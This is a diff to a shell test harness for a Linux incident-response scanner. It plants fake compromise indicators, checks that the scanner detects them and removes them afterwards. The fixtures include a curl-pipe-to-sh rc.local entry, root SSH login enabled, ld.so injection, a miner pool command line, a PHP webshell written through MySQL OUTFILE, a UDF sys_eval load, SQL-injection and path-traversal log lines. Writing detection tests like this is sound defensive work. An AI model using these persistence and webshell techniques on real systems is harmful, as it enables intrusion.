@@ -83,6 +83,27 @@ echo '10.88.88.88 - - [12/Nov/2026:10:01:00 +0800] "GET /index.php?id=1%20UNION%
 echo '10.77.77.77 - - [12/Nov/2026:10:02:00 +0800] "GET /static/../../etc/passwd HTTP/1.1" 200 - "-" "Mozilla/5.0"' >> /www/wwwlogs/ctfir-marker.com.log
 printf '# Time: 2026-11-12T10:00:00\nSELECT "<?php eval($_POST[1]);?>" INTO OUTFILE "/var/www/html/ctfir-marker-slow.php";\n' > /var/log/mysql/mysql-slow.log
 printf 'Query\tCREATE FUNCTION sys_eval RETURNS STRING SONAME "udf.so"\n' > /var/lib/mysql/mysql-bin.000001
+# --- 原 manual 自动化：L10/L16/L18/L22/L23/L27/L32/L34/L35/L48 ---
+echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
+echo 'curl http://127.0.0.1/ctfir-marker | sh' > /etc/rc.local
+chmod +x /etc/rc.local
+mkdir -p /etc/ld.so.conf.d /etc/nginx /var/log
+echo "/tmp/ctfir-marker-lib" > /etc/ld.so.conf.d/ctfir-marker.conf
+cp -f /bin/sleep /tmp/ctfir-marker-del
+chmod +x /tmp/ctfir-marker-del
+/tmp/ctfir-marker-del 600 &
+sleep 0.3
+rm -f /tmp/ctfir-marker-del
+# 禁止 bash 对最后一条命令做 exec 优化，否则 token 不在进程 cmdline
+sh -c 'sleep 600; true' 'stratum+tcp://ctfir-marker.example:3333' &
+mkdir -p /var/log
+i=0; while [ $i -lt 22 ]; do
+  echo "Nov 12 10:00:00 centos sshd[1]: Failed password for root from 10.66.66.66 port 22 ssh2" >> /var/log/secure
+  i=$((i+1))
+done
+printf 'server { root /var/www/html; }\n' > /etc/nginx/nginx.conf
+printf 'MZ' > /tmp/ctfir-marker-invoice.pdf.exe
+printf "# Time: 2026-11-12\nSELECT id FROM users WHERE id=1;\n" > /var/log/mysql/mysql-slow-normal.log
 echo INSTALL_DONE
 FIXEOF
 
@@ -121,6 +142,18 @@ sed -i '/^Port 2222$/d' /etc/ssh/sshd_config 2>/dev/null || true
 rmdir /etc/redis 2>/dev/null
 rm -f /etc/systemd/system/multi-user.target.wants/ctfir-marker-telnet.service
 chmod og-rwx /etc/shadow 2>/dev/null
+
+rm -f /etc/rc.local /etc/ld.so.conf.d/ctfir-marker.conf /etc/nginx/nginx.conf
+rm -f /var/log/mysql/mysql-slow-normal.log /tmp/ctfir-marker-invoice.pdf.exe
+sed -i '/^PermitRootLogin yes$/d' /etc/ssh/sshd_config 2>/dev/null || true
+# 不要清空整个 secure（系统日志）；只删夹具行
+if [ -f /var/log/secure ]; then grep -v "10.66.66.66" /var/log/secure > /tmp/secure.cln && cat /tmp/secure.cln > /var/log/secure; rm -f /tmp/secure.cln; fi
+for pd in /proc/[0-9]*; do
+  cmd=$(tr "\0" " " < "$pd/cmdline" 2>/dev/null)
+  case "$cmd" in *ctfir-marker.example*|*ctfir-marker-del*) kill -9 "${pd##*/}" 2>/dev/null ;; esac
+  rl=$(readlink "$pd/exe" 2>/dev/null)
+  case "$rl" in *ctfir-marker-del*) kill -9 "${pd##*/}" 2>/dev/null ;; esac
+done
 echo CLEANUP_DONE
 CLNEOF
 
@@ -145,7 +178,7 @@ echo "=== 阶段2：夹具安装 ==="
 ex '/tmp/install.sh' | tail -1
 
 echo "=== 阶段3：扫描断言（root + --baseline + --dir）==="
-ex 'mkdir -p /tmp/ctfir-baseline; echo original-one > /tmp/ctfir-baseline/a.txt; echo original-two > /tmp/ctfir-baseline/b.txt; sha256sum /tmp/ctfir-baseline/a.txt /tmp/ctfir-baseline/b.txt | sed "s|/tmp/ctfir-baseline/||" > /tmp/ctfir-baseline.list; echo modified-one > /tmp/ctfir-baseline/a.txt'
+ex 'mkdir -p /tmp/ctfir-baseline; echo original-one > /tmp/ctfir-baseline/a.txt; echo original-two > /tmp/ctfir-baseline/b.txt; sha256sum /tmp/ctfir-baseline/a.txt /tmp/ctfir-baseline/b.txt | sed "s|/tmp/ctfir-baseline/||" > /tmp/ctfir-baseline.list; echo modified-one > /tmp/ctfir-baseline/a.txt; echo "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef  missing-ctfir-marker.txt" >> /tmp/ctfir-baseline.list; printf MZ > /tmp/ctfir-baseline/invoice.pdf.exe'
 ex 'rm -rf /tmp/ctfir-out-pos && /tmp/ctfir scan --out /tmp/ctfir-out-pos --baseline /tmp/ctfir-baseline.list --dir /tmp/ctfir-baseline >/dev/null 2>&1; echo exit=$?'
 RES=$(ex 'cat /tmp/ctfir-out-pos/findings.json')
 
@@ -207,6 +240,17 @@ a "LNX.PERSIST.SSHLOG.001"      "SSHLOG 命中"            "SSHLOG 漏检"
 a "LNX.WEB.LOGATTACK.001"       "GET 攻击特征命中"       "LOGATTACK 漏检"
 a "MID.MYSQL.SLOWLOG.001"       "slow log 写马命中"      "slow log 漏检"
 a "MID.MYSQL.BINLOG.001"        "binlog UDF 命中"        "binlog 漏检"
+echo "--- 原 manual 自动化 L10/L16/L18/L22/L23/L27/L32/L34/L35/L48 ---"
+a "LNX.SSH.CONFIG.001"          "PermitRootLogin yes 命中" "L10 漏检"
+a "LNX.PERSIST.RCLOCAL.001"     "rc.local 命中"           "L16 漏检"
+a "LNX.LDSO.INJECT.001"         "ld.so.conf.d 命中"       "L18 漏检"
+a "LNX.PROC.DELETED.001"        "已删除 exe 命中"          "L22 漏检"
+a "LNX.PROC.MINER.001"          "矿池命令行命中"           "L23 漏检"
+a "LNX.LOG.AUTHFAIL.001"        "auth 失败 Top IP 命中"   "L27 漏检"
+a "LNX.FILES.BASELINE.MISS.001" "基线缺失命中"             "L34 漏检"
+a "LNX.FILES.DOUBLEEXT.001"     "双扩展名命中"             "L35 漏检"
+grep -q "/var/www" /d/ctfir-build/ev-dump.json && ok "L32 web/nginx 根定位" || bad "L32 根定位漏检"
+grep -q "mysql-slow-normal" "$RESF" && bad "L48 正常 SELECT 误报" || ok "L48 正常 SELECT 不报"
 grep -q "ADVICE" "$RESF" && ok "建议挂接" || bad "建议缺失"
 
 echo "=== 阶段3.5：fix 一键修复闭环（识别→修复→环境恢复逐项检查）==="
